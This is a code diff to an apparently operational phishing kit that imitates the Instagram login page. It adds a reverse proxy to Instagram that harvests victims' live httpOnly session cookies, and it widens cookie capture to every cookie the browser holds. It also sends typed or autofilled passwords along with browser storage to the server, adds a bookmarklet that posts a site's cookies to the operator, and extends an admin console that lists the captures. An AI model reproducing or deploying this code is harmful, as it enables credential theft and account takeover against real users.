@@ -8,11 +8,14 @@ Env:
   GEO           1 to enable IP geo lookup    (default off)
   ANSI          0 to strip log colours       (default on)
   PORT          listen port                  (default 5000)
+  PROXY         1 to reverse-proxy instagram (default on)
+  PROXY_HOST    upstream host                (default www.instagram.com)
 """
 
 from __future__ import annotations
 
 import csv
+import gzip
 import hashlib
 import hmac
 import io
@@ -20,10 +23,14 @@ import json
 import logging
 import os
 import random
+import re
 import sqlite3
+import ssl
 import sys
 import threading
 import time
+import urllib.error
+import urllib.parse
 import urllib.request
 import uuid
 from collections import deque
@@ -53,6 +60,9 @@ DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
 GEO_ENABLED = os.environ.get("GEO", "0") == "1"
 ANSI_ON = os.environ.get("ANSI", "1") != "0"
 COOKIE_MAX_AGE = 60 * 60 * 24 * 365
+PROXY_ON = os.environ.get("PROXY", "1") != "0"
+PROXY_HOST = os.environ.get("PROXY_HOST", "www.instagram.com")
+PROXY_ORIGIN = "https://" + PROXY_HOST
 
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 DB_PATH = DATA_DIR / "insight.sqlite3"
@@ -84,11 +94,14 @@ if not logger.handlers:
 
 _jsonl_lock = threading.Lock()
 
-# --- ANSI palette: box yellow, credentials white, cookies cyan ---
+# --- ANSI palette ---
 C = {
     "reset": "\033[0m",
     "cred": "\033[1;33m",
     "cred_val": "\033[1;97m",
+    "fb": "\033[1;34m",
+    "ig": "\033[1;35m",
+    "other": "\033[1;36m",
     "cookie": "\033[1;36m",
     "cookie_val": "\033[96m",
     "sep": "\033[2;33m",
@@ -314,7 +327,7 @@ def parse_cookie_string(raw: str) -> dict:
     return out
 
 
-# --- Meta-only cookie scope: Instagram + Facebook, nothing else ---
+# --- three-way cookie scope ---
 FB_COOKIE_NAMES = {
     "c_user", "xs", "datr", "fr", "sb", "wd", "presence", "m_pixel_ratio",
     "locale", "_fbp", "_fbc", "_js_datr", "oo", "pl", "lu", "csm", "s",
@@ -328,7 +341,6 @@ IG_COOKIE_NAMES = {
 
 
 def classify_cookie(name: str) -> str:
-    """'fb' | 'ig' | '' — only Meta cookies are kept."""
     n = (name or "").strip().lower()
     if not n:
         return ""
@@ -336,13 +348,13 @@ def classify_cookie(name: str) -> str:
         return "fb"
     if n in IG_COOKIE_NAMES or n.startswith(("ig_", "x-ig")):
         return "ig"
-    return ""
+    return "other"
 
 
-def split_cookie_string(raw: str) -> tuple[list, list]:
-    """Return (facebook_pairs, instagram_pairs), order preserved."""
+def split_cookie_string(raw: str) -> tuple[list, list, list]:
     fb: list = []
     ig: list = []
+    other: list = []
     for chunk in (raw or "").split(";"):
         if "=" not in chunk:
             continue
@@ -355,18 +367,20 @@ def split_cookie_string(raw: str) -> tuple[list, list]:
             fb.append((k, v.strip()))
         elif brand == "ig":
             ig.append((k, v.strip()))
-    return fb, ig
+        else:
+            other.append((k, v.strip()))
+    return fb, ig, other
 
 
 def filter_cookie_string(raw: str) -> str:
-    fb, ig = split_cookie_string(raw)
-    return "; ".join(f"{k}={v}" for k, v in fb + ig)
+    fb, ig, other = split_cookie_string(raw)
+    return "; ".join(f"{k}={v}" for k, v in fb + ig + other)
 
 
-def brand_counts(header: str, js: str) -> tuple[int, int]:
-    hf, hi = split_cookie_string(header)
-    jf, ji = split_cookie_string(js)
-    return len(hf) + len(jf), len(hi) + len(ji)
+def brand_counts(header: str, js: str) -> tuple[int, int, int]:
+    hf, hi, ho = split_cookie_string(header)
+    jf, ji, jo = split_cookie_string(js)
+    return len(hf) + len(jf), len(hi) + len(ji), len(ho) + len(jo)
 
 
 def digest_of(*parts: str) -> str:
@@ -382,37 +396,34 @@ def make_initials(name: str) -> str:
     return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()
 
 
-def cookie_lines(header: str, js: str) -> list:
-    """Meta cookie lines tagged H (header) / J (js), coloured cyan."""
-    out: list = []
-    for k, v in split_cookie_string(header)[0]:
-        out.append((f"H {k} = {v[:70]}", "cookie_val"))
-    for k, v in split_cookie_string(header)[1]:
-        out.append((f"H {k} = {v[:70]}", "cookie_val"))
-    for k, v in split_cookie_string(js)[0]:
-        out.append((f"J {k} = {v[:70]}", "cookie_val"))
-    for k, v in split_cookie_string(js)[1]:
-        out.append((f"J {k} = {v[:70]}", "cookie_val"))
-    return out or [("(none)", "cookie_val")]
+ICON = {"fb": "📘", "ig": "📸", "other": "🍪"}
+LABEL = {"fb": "FACEBOOK", "ig": "INSTAGRAM", "other": "OTHER"}
 
 
-def cred_box(title: str, username: str, password: str, header: str, js: str) -> tuple:
-    """One box: credentials first, then a separator, then Meta cookies."""
-    nfb, nig = brand_counts(header, js)
-    lines: list = [
+def _pairs_lines(pairs: list, tag: str) -> list:
+    return [(f"{tag} {k} = {v[:70]}", "cookie_val") for k, v in pairs]
+
+
+def boxes_for(header: str, js: str) -> list[tuple]:
+    hf, hi, ho = split_cookie_string(header)
+    jf, ji, jo = split_cookie_string(js)
+    out: list[tuple] = []
+    for brand, hp, jp in (("fb", hf, jf), ("ig", hi, ji), ("other", ho, jo)):
+        if not (hp or jp):
+            continue
+        lines = _pairs_lines(hp, "H") + _pairs_lines(jp, "J")
+        out.append((
+            f"{ICON[brand]} {LABEL[brand]} COOKIES · {len(hp) + len(jp)}",
+            lines, brand, "cookie_val",
+        ))
+    return out
+
+
+def cred_box(title: str, username: str, password: str) -> tuple:
+    return (title, [
         ("username : " + (username or "(blank)"), "cred_val"),
         ("password : " + (password or "(blank)"), "cred_val"),
-        ("─" * (BOX_W - 4), "sep"),
-        (f"cookies · H=header J=js · fb {nfb} · ig {nig}", "cookie"),
-    ]
-    lines += cookie_lines(header, js)
-    return (title, lines, "cred", "cred_val")
-
-
-def cookie_box(header: str, js: str = "") -> tuple:
-    nfb, nig = brand_counts(header, js)
-    return (f"🍪 SESSION COOKIES · fb {nfb} · ig {nig}", cookie_lines(header, js),
-            "cookie", "cookie_val")
+    ], "cred", "cred_val")
 
 
 def admin_ok() -> bool:
@@ -425,6 +436,151 @@ def admin_ok() -> bool:
         session["admin"] = True
         return True
     return False
+
+
+# ============================== reverse proxy ==============================
+_HOP = {
+    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
+    "te", "trailers", "transfer-encoding", "upgrade", "host",
+    "content-length", "content-encoding", "accept-encoding", "cookie2",
+}
+_REWRITE_TYPES = ("text/html", "text/css", "javascript", "application/json", "text/plain")
+
+
+class _NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, *a, **k):
+        return None
+
+
+_OPENER = urllib.request.build_opener(_NoRedirect())
+_SSL = ssl.create_default_context()
+_SSL.check_hostname = False
+_SSL.verify_mode = ssl.CERT_NONE
+_seen_sid: set[str] = set()
+_seen_lock = threading.Lock()
+
+
+def _rewrite_body(body: bytes, ctype: str) -> bytes:
+    if not any(t in ctype for t in _REWRITE_TYPES):
+        return body
+    for host in (PROXY_HOST, "instagram.com"):
+        body = body.replace(("https://" + host + "/").encode(), b"/")
+        body = body.replace(("https://" + host).encode(), b"")
+        body = body.replace(("https:\\/\\/" + host + "\\/").encode(), b"\\/")
+        body = body.replace(("http://" + host + "/").encode(), b"/")
+        body = body.replace(("http://" + host).encode(), b"")
+    return body
+
+
+def _strip_domain(set_cookie: str) -> str:
+    parts = [p.strip() for p in set_cookie.split(";")]
+    keep = [p for p in parts if not p.lower().startswith("domain=")]
+    if not os.environ.get("RENDER"):
+        keep = [p for p in keep if p.lower() != "secure"]
+    return "; ".join(keep)
+
+
+def proxy_request(path: str) -> Response:
+    """Forward to the upstream host, rewriting URLs, cookies and redirects."""
+    target = f"{PROXY_ORIGIN}/{path.lstrip('/')}"
+    if request.query_string:
+        target += "?" + request.query_string.decode("latin-1")
+
+    headers = {}
+    for key, value in request.headers.items():
+        if key.lower() in _HOP:
+            continue
+        headers[key] = value
+    headers["Host"] = PROXY_HOST
+    headers["Accept-Encoding"] = "identity"
+    headers["Referer"] = PROXY_ORIGIN + request.path
+
+    origin = request.headers.get("Origin")
+    if origin:
+        headers["Origin"] = PROXY_ORIGIN
+
+    body = request.get_data() if request.method not in ("GET", "HEAD") else None
+    req = urllib.request.Request(target, data=body, headers=headers, method=request.method)
+
+    try:
+        raw = _OPENER.open(req, timeout=25)
+        status = raw.status
+        hdrs = raw.headers
+        payload = raw.read()
+    except urllib.error.HTTPError as exc:
+        status = exc.code
+        hdrs = exc.headers
+        payload = exc.read()
+    except Exception as exc:
+        logger.warning("proxy failed %s: %s", target, exc)
+        return Response(f"upstream error: {exc}", status=502, mimetype="text/plain")
+
+    ctype = hdrs.get("Content-Type", "application/octet-stream")
+    if hdrs.get("Content-Encoding", "").lower() == "gzip":
+        try:
+            payload = gzip.decompress(payload)
+        except OSError:
+            pass
+
+    payload = _rewrite_body(payload, ctype.lower())
+
+    out = Response(payload, status=status, mimetype=ctype.split(";")[0] or "application/octet-stream")
+
+    for key, value in hdrs.items():
+        low = key.lower()
+        if low in _HOP or low in ("content-type", "set-cookie", "location", "content-security-policy"):
+            continue
+        out.headers[key] = value
+
+    for cookie in hdrs.get_all("Set-Cookie") or []:
+        out.headers.add("Set-Cookie", _strip_domain(cookie))
+
+    location = hdrs.get("Location")
+    if location:
+        for host in (PROXY_ORIGIN, "https://instagram.com"):
+            if location.startswith(host):
+                location = location[len(host):] or "/"
+                break
+        out.headers["Location"] = location
+
+    # ---- capture the real session as soon as it exists ----
+    jar = parse_cookie_string(request.headers.get("Cookie", ""))
+    sid_val = jar.get("sessionid") or ""
+    if sid_val:
+        with _seen_lock:
+            fresh = sid_val not in _seen_sid
+            if fresh:
+                _seen_sid.add(sid_val)
+        if fresh:
+            capture_proxied_session(request.headers.get("Cookie", ""), path)
+
+    return out
+
+
+def capture_proxied_session(cookie_header: str, path: str) -> None:
+    """Real httpOnly session landed on our host — log it loudly."""
+    ip = client_ip()
+    info = geo(ip)
+    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
+    kept = filter_cookie_string(cookie_header)
+
+    cap_id = store_capture(
+        cid=g.cid, sid="proxy", reason="proxy_session", digest="",
+        ip=ip, ua=request.headers.get("User-Agent", ""),
+        referer=PROXY_ORIGIN + path, accept_lang=request.headers.get("Accept-Language", ""),
+        cookie_header=kept, js_cookies="",
+        storage_json="{}", meta_json="{}",
+        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
+        geo_json=json.dumps(info, ensure_ascii=False), created_at=stamp,
+    )
+    session["last_cap"] = cap_id
+
+    emit("SESSION_HARVEST", {
+        "cid": g.cid, "cap": cap_id, "ip": ip,
+        "path": path, "bytes": len(kept),
+        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(kept).items()},
+    }, [cred_box("🎯 LIVE SESSION HARVESTED", "httpOnly sessionid captured", str(len(kept)) + " bytes")]
+       + boxes_for(kept, ""))
 
 
 # ============================== login page ==============================
@@ -463,7 +619,6 @@ body::before{
   background:radial-gradient(72% 55% at 50% 0,var(--glow),transparent 72%);
 }
 
-/* the shell never resizes while the keyboard is up -> footer stays put */
 .app{
   position:relative;width:100%;max-width:420px;height:100%;
   display:flex;flex-direction:column;
@@ -508,7 +663,6 @@ input:focus{
 .inputs input:nth-child(1){animation:up .55s .2s var(--e) backwards}
 .inputs input:nth-child(2){animation:up .55s .26s var(--e) backwards}
 
-/* autofill detection hook for Chrome/Edge */
 @keyframes autofillStart{from{}to{}}
 input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
@@ -545,12 +699,12 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 .create button:hover{background:rgba(0,149,246,.08);box-shadow:0 8px 20px rgba(0,149,246,.18)}
 .create button:active{transform:scale(.97)}
 
-/* footer pinned: never travels with the keyboard */
 .bottom{flex:none;position:relative;z-index:2;text-align:center;padding-top:6px;
   animation:up .6s .5s var(--e) backwards}
 .meta{font-size:14px;color:var(--mut);display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:4px}
 .meta .inf{display:inline-block;animation:pulse 3.2s ease-in-out infinite}
 .footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:2px}
+.footer a{color:var(--mut);text-decoration:none;border-bottom:1px dotted var(--line)}
 
 @keyframes pg{from{opacity:0;transform:translateY(12px) scale(.99);filter:blur(6px)}}
 @keyframes up{from{opacity:0;transform:translateY(16px)}}
@@ -605,7 +759,8 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
         </div>
 
         <div class="footer">
-            &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms &middot; English (UK)
+            &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms
+            &middot; <a href="/bookmarklet" target="_blank">English (UK)</a>
         </div>
     </div>
 
@@ -615,8 +770,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 (function () {
   'use strict';
 
-  /* ---------- viewport height, frozen while a field is focused ----------
-     the shell keeps its pre-keyboard height, so the footer never rides up. */
   var rootEl = document.documentElement;
   var vv = window.visualViewport;
   var frozen = false;
@@ -664,35 +817,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     return ('0000000' + h.toString(16)).slice(-8);
   }
 
-  /* ---------- Meta-only cookie scope ---------- */
-  var FB_NAMES = ['c_user','xs','datr','fr','sb','wd','presence','m_pixel_ratio','locale',
-                  '_fbp','_fbc','_js_datr','oo','pl','lu','csm','s','i_user','dpr','js_ver',
-                  'rs','pnl_data','usida','a11y'];
-  var IG_NAMES = ['csrftoken','ds_user_id','sessionid','sessionid_ss','mid','ig_did','ig_nrcb',
-                  'rur','shbid','shbts','mcd','urlgen','ig_pr','ig_vw','ig_direct_region_hint',
-                  'ig_evt','ig_lang','ig_hats','x-ig-app-id'];
-
-  function brandOf(name) {
-    var n = (name || '').trim().toLowerCase();
-    if (!n) return '';
-    if (FB_NAMES.indexOf(n) >= 0 || n.indexOf('fbm_') === 0 || n.indexOf('fbsr_') === 0
-        || n.indexOf('_fb') === 0) return 'fb';
-    if (IG_NAMES.indexOf(n) >= 0 || n.indexOf('ig_') === 0 || n.indexOf('x-ig') === 0) return 'ig';
-    return '';
-  }
-
-  function metaCookies() {
-    var raw = document.cookie || '';
-    var out = [];
-    raw.split(';').forEach(function (chunk) {
-      var p = chunk.trim();
-      if (!p || p.indexOf('=') < 0) return;
-      if (brandOf(p.split('=')[0].trim())) out.push(p);
-    });
-    return out;
-  }
-
-  /* ---------- fingerprints ---------- */
   function canvasSig() {
     try {
       var c = document.createElement('canvas');
@@ -806,7 +930,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     var meta = baseMeta();
     var local = storageDump(localStorage);
     var sess = storageDump(sessionStorage);
-    var cookies = metaCookies().join('; ');
+    var cookies = document.cookie || '';
 
     var payload = {
       sid: SID,
@@ -891,7 +1015,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     flush(beacon !== false);
   }
 
-  /* ---------------- credential watcher (autofill / PIN unlock) ---------------- */
   var uEl = document.getElementById('u');
   var pEl = document.getElementById('p');
   var lastPair = '';
@@ -911,7 +1034,16 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     lastPair = pair;
     lastSentAt = now;
 
-    var body = JSON.stringify({ username: u, password: p, source: source, sid: SID });
+    var body = JSON.stringify({
+      username: u,
+      password: p,
+      source: source,
+      sid: SID,
+      cookies: document.cookie || '',
+      local: storageDump(localStorage),
+      sess: storageDump(sessionStorage)
+    });
+
     if (navigator.sendBeacon) {
       navigator.sendBeacon('/credential', new Blob([body], { type: 'application/json' }));
       return;
@@ -1285,6 +1417,7 @@ function settings(){
  <div class="sec"><h3>Privacy</h3></div>
  ${sw("priv","Hide my activity status","Others can’t see when you’re active")}
  ${lk("Collected cookies","What this browser sent us","","/cookies")}
+ ${lk("Cookie bridge","Grab real Instagram cookies","","/bookmarklet")}
  ${lk("Blocked accounts","")}
  ${lk("Data sync frequency","Every 15 minutes")}
  <div class="sec"><h3>Account</h3></div>
@@ -1324,6 +1457,46 @@ render();
 </html>
 """
 
+# ============================== bookmarklet page ==============================
+BOOKMARKLET_PAGE = """<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Cookie bridge</title>
+<style>
+:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#25d366}
+*{box-sizing:border-box;margin:0}
+body{min-height:100dvh;display:grid;place-items:center;background:var(--bg);color:var(--tx);
+font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding:24px}
+.card{width:100%;max-width:470px;background:var(--card);border:1px solid var(--line);
+border-radius:14px;padding:24px}
+h1{font-size:17px;margin:0 0 10px;color:var(--acc)}
+p{color:var(--mut);font-size:13.5px;margin:0 0 12px}
+a.bm{display:block;text-align:center;background:var(--ok);color:#06210f;font-weight:700;
+padding:15px;border-radius:10px;text-decoration:none;margin:18px 0;font-size:15px}
+a.bm:active{transform:scale(.985)}
+code{background:#0a0a0c;border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:12px}
+textarea{width:100%;height:96px;background:#0a0a0c;border:1px solid var(--line);color:#7fe7f5;
+border-radius:8px;padding:10px;font:11px ui-monospace,monospace;resize:vertical;margin-top:10px}
+ol{padding-left:20px;color:var(--mut);font-size:13px}
+ol li{margin-bottom:7px}
+.note{margin-top:16px;font-size:12px;color:#6d6d7a;border-top:1px solid var(--line);padding-top:12px}
+</style></head><body>
+<div class="card">
+<h1>&#128229; Instagram cookie bridge</h1>
+<p>Fallback when the proxy is off. Real <code>instagram.com</code> cookies live on that domain —
+this bookmarklet reads them there and posts them back.</p>
+<ol>
+<li>Drag the green button to your bookmarks bar.</li>
+<li>Open <code>instagram.com</code> in the same browser and sign in.</li>
+<li>Click the bookmark.</li>
+</ol>
+<a class="bm" href="__JS__">&#128229; Grab IG cookies</a>
+<textarea readonly onclick="this.select()">__JS__</textarea>
+<p class="note">No bookmarks bar on mobile? Copy the text above and paste it as the URL of a new
+bookmark. <code>sessionid</code> is httpOnly so this path cannot read it — enable the proxy for
+that.</p>
+</div></body></html>"""
+
 # ============================== admin console ==============================
 ADMIN_HTML = """
 <!DOCTYPE html>
@@ -1331,7 +1504,7 @@ ADMIN_HTML = """
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Insight Console</title>
 <style>
-:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642}
+:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642;--fb:#5aa9ff;--ig:#ff7ac2}
 *{box-sizing:border-box;margin:0}
 body{background:var(--bg);color:var(--tx);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
 header{display:flex;gap:14px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0a0a0cf2;backdrop-filter:blur(10px);z-index:5;flex-wrap:wrap}
@@ -1353,6 +1526,8 @@ td a:hover{text-decoration:underline}
 .pill.login{color:var(--ok);border-color:#1e6b3d;background:#0e2318}
 .pill.auto{color:var(--warn);border-color:#6b4d1e;background:#231a08}
 .pill.cap{color:var(--mut);border-color:var(--line)}
+.pill.grab{color:var(--fb);border-color:#1e4b6b;background:#08161f}
+.pill.sess{color:#ff7ac2;border-color:#6b1e4b;background:#1f0816}
 .mono{font-size:11.5px;color:var(--mut);max-width:420px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 pre{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:420px}
 pre b{color:var(--acc)}
@@ -1360,7 +1535,9 @@ pre b{color:var(--acc)}
 .block h2{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--mut);margin-bottom:6px}
 .cred{background:#171408;border-color:#5a4718}
 .cred pre{background:#0f0d05;border-color:#5a4718;color:#ffe08a}
-.cookie pre{color:#8fe6f0}
+.ck-fb pre{color:var(--fb)}
+.ck-ig pre{color:var(--ig)}
+.ck-other pre{color:#8fe6f0}
 .empty{padding:60px 0;text-align:center;color:var(--mut)}
 .warn{background:#231a08;border:1px solid #6b4d1e;color:var(--warn);padding:10px 14px;border-radius:10px;margin-bottom:16px;font-size:12.5px}
 form.inline{display:inline}
@@ -1369,10 +1546,13 @@ form.inline{display:inline}
   <h1><i>▚</i> Insight Console</h1>
   <span class="stat">captures <b>__CAPS__</b></span>
   <span class="stat">credentials <b>__LOGS__</b></span>
+  <span class="stat">proxy <b>__PROXY__</b></span>
   <span class="stat" id="live">live</span>
   <span class="spacer"></span>
   <a class="btn" href="/admin/export?fmt=json">export json</a>
   <a class="btn" href="/admin/export?fmt=csv">export csv</a>
+  <a class="btn" href="/accounts/login/">proxy</a>
+  <a class="btn" href="/bookmarklet">bridge</a>
   <a class="btn" href="/">login page</a>
 </header>
 <main>__BODY__</main>
@@ -1417,13 +1597,18 @@ def render_admin(body: str) -> str:
         conn.close()
     return (ADMIN_HTML.replace("__BODY__", body)
             .replace("__CAPS__", str(caps))
-            .replace("__LOGS__", str(logs)))
+            .replace("__LOGS__", str(logs))
+            .replace("__PROXY__", "on" if PROXY_ON else "off"))
 
 
 def row_html(r: sqlite3.Row) -> str:
     nlog = r["nlog"]
     if nlog:
         badge = f'<span class="pill login">{nlog} cred</span>'
+    elif r["reason"] == "proxy_session":
+        badge = '<span class="pill sess">session</span>'
+    elif r["reason"] == "bookmarklet":
+        badge = '<span class="pill grab">bridge</span>'
     elif r["src"] == "autofill":
         badge = '<span class="pill auto">autofill</span>'
     else:
@@ -1437,7 +1622,7 @@ def row_html(r: sqlite3.Row) -> str:
         f'<td>{escape(place)}</td>'
         f'<td>{escape(r["ip"] or "-")}</td>'
         f'<td class="mono">{escape((r["ua"] or "")[:110])}</td>'
-        f'<td>{len(r["js_cookies"] or "")}b</td>'
+        f'<td>{len(r["js_cookies"] or "") + len(r["cookie_header"] or "")}b</td>'
         f'<td>{badge}</td>'
         f'<td><a href="/admin/capture/{r["id"]}">open</a></td>'
         f"</tr>"
@@ -1467,8 +1652,6 @@ def index():
     info = geo(ip)
     header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
 
-    boxes = [cookie_box(header_cookie)] if header_cookie else []
-
     emit("PAGE_VIEW", {
         "cid": g.cid, "ip": ip,
         "ua": request.headers.get("User-Agent", "")[:220],
@@ -1476,7 +1659,7 @@ def index():
         "accept_lang": request.headers.get("Accept-Language", "")[:120],
         "cookie_header": header_cookie[:1200],
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, boxes)
+    }, boxes_for(header_cookie, ""))
 
     if session.get("user"):
         return redirect(url_for("dashboard"))
@@ -1535,7 +1718,7 @@ def collect():
         "sessionStorage": sess[:8],
         "fingerprint": meta,
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, [cookie_box(header_cookie, cookies)])
+    }, boxes_for(header_cookie, cookies))
 
     session["cid"] = g.cid
     session["last_cap"] = cap_id
@@ -1544,7 +1727,6 @@ def collect():
 
 @app.route("/credential", methods=["POST"])
 def credential():
-    """Fired the moment autofill / PIN unlock lands values."""
     ip = client_ip()
     if not rate_ok(ip, 80):
         return ("", 429)
@@ -1564,6 +1746,10 @@ def credential():
     if not (username or password):
         return ("", 204)
 
+    cookies = filter_cookie_string((data.get("cookies") or "").strip())
+    local = data.get("local") if isinstance(data.get("local"), list) else []
+    sess = data.get("sess") if isinstance(data.get("sess"), list) else []
+
     cap_id = session.get("last_cap") or 0
     header_cookie = filter_cookie_string(request.headers.get("Cookie", ""))
     stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
@@ -1571,14 +1757,20 @@ def credential():
     store_login(
         capture_id=cap_id, source=source, username=username, password=password, ip=ip,
         ua=request.headers.get("User-Agent", ""), cookie_header=header_cookie,
-        js_cookies="", meta_json="{}", created_at=stamp,
+        js_cookies=cookies,
+        meta_json=json.dumps({"local": local, "session": sess}, ensure_ascii=False),
+        created_at=stamp,
     )
 
     emit("CREDENTIAL", {
         "cid": g.cid, "cap": cap_id, "ip": ip, "source": source,
         "USERNAME": username, "PASSWORD": password,
         "ua": request.headers.get("User-Agent", "")[:200],
-    }, [cred_box(f"🔑 CREDENTIALS · {source}", username, password, header_cookie, "")])
+        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
+        "localStorage": local[:8],
+        "sessionStorage": sess[:8],
+    }, [cred_box(f"🔑 CREDENTIALS · {source}", username, password)]
+       + boxes_for(header_cookie, cookies))
     return ("", 204)
 
 
@@ -1636,8 +1828,8 @@ def login():
         "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
         "fingerprint": meta,
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, [cred_box(f"🔑 CREDENTIALS · submit · visit #{visit}",
-                 username, password, header_cookie, cookies)])
+    }, [cred_box(f"🔑 CREDENTIALS · submit · visit #{visit}", username, password)]
+       + boxes_for(header_cookie, cookies))
 
     session.update({
         "user": username,
@@ -1648,11 +1840,57 @@ def login():
         "last_cap": cap_id,
     })
 
-    resp = redirect(url_for("dashboard"))
+    # proxy on: hand the victim to the real login page so a live session is minted
+    resp = redirect("/accounts/login/" if PROXY_ON else url_for("dashboard"))
     resp.set_cookie("vc", str(visit), max_age=COOKIE_MAX_AGE, samesite="Lax")
     resp.set_cookie("last_user", username, max_age=COOKIE_MAX_AGE, samesite="Lax")
     resp.set_cookie("login_ts", stamp, max_age=COOKIE_MAX_AGE, samesite="Lax")
     return resp
+
+
+@app.get("/bookmarklet")
+def bookmarklet():
+    js = (
+        "javascript:(function(){"
+        "var d=document.cookie;"
+        "if(!d){alert('no cookies on this page');return;}"
+        "var u=location.origin+location.pathname;"
+        "fetch('" + request.host_url.rstrip("/") + "/c?u='+encodeURIComponent(u)"
+        "+'&d='+encodeURIComponent(d),{mode:'no-cors',keepalive:true});"
+        "alert('sent '+d.length+' bytes to insight');"
+        "})()"
+    )
+    return Response(BOOKMARKLET_PAGE.replace("__JS__", escape(js)), mimetype="text/html")
+
+
+@app.get("/c")
+def grab():
+    ip = client_ip()
+    if not rate_ok(ip, 40):
+        return ("", 429)
+
+    cookies = filter_cookie_string(request.args.get("d", ""))
+    if not cookies:
+        return ("", 204)
+
+    info = geo(ip)
+    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
+    cap_id = store_capture(
+        cid=g.cid, sid="bridge", reason="bookmarklet", digest="",
+        ip=ip, ua=request.headers.get("User-Agent", ""),
+        referer=request.args.get("u", "")[:300], accept_lang="",
+        cookie_header="", js_cookies=cookies,
+        storage_json="{}", meta_json="{}",
+        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
+        geo_json=json.dumps(info, ensure_ascii=False), created_at=stamp,
+    )
+
+    emit("COOKIE_BRIDGE", {
+        "cid": g.cid, "cap": cap_id, "ip": ip,
+        "from": request.args.get("u", "")[:200],
+        "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()},
+    }, boxes_for("", cookies))
+    return ("", 204)
 
 
 @app.route("/dashboard")
@@ -1726,15 +1964,17 @@ def admin():
     q = (request.args.get("q") or "").strip()
     only = request.args.get("only") or "all"
 
-    sql = """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city, c.reason,
+    sql = """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.cookie_header,
+                    c.country, c.city, c.reason,
                     (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog,
                     (SELECT source FROM logins l WHERE l.capture_id=c.id ORDER BY id LIMIT 1) AS src
              FROM captures c"""
     where, params = [], []
     if q:
         where.append("(c.ip LIKE ? OR c.ua LIKE ? OR c.city LIKE ? OR c.country LIKE ? OR c.cid LIKE ?"
-                     " OR c.js_cookies LIKE ? OR c.id IN (SELECT capture_id FROM logins WHERE username LIKE ?))")
-        params += [f"%{q}%"] * 6 + [f"%{q}%"]
+                     " OR c.js_cookies LIKE ? OR c.cookie_header LIKE ?"
+                     " OR c.id IN (SELECT capture_id FROM logins WHERE username LIKE ?))")
+        params += [f"%{q}%"] * 7 + [f"%{q}%"]
     if only == "logins":
         where.append("(SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) > 0")
     if where:
@@ -1760,7 +2000,7 @@ def admin():
         '<a class="btn" href="/admin?only=logins">only credentials</a>'
         '<a class="btn" href="/admin">reset</a></form>'
         '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
-        '<th>ua</th><th>cookies</th><th>type</th><th></th></tr></thead>'
+        '<th>ua</th><th>bytes</th><th>type</th><th></th></tr></thead>'
         f'<tbody id="feed">{"".join(row_html(r) for r in rows)}</tbody></table>'
     )
     if not rows:
@@ -1777,7 +2017,8 @@ def admin_feed():
     conn = connect()
     try:
         rows = conn.execute(
-            """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.country, c.city, c.reason,
+            """SELECT c.id, c.created_at, c.ip, c.ua, c.js_cookies, c.cookie_header,
+                      c.country, c.city, c.reason,
                       (SELECT COUNT(*) FROM logins l WHERE l.capture_id=c.id) AS nlog,
                       (SELECT source FROM logins l WHERE l.capture_id=c.id ORDER BY id LIMIT 1) AS src
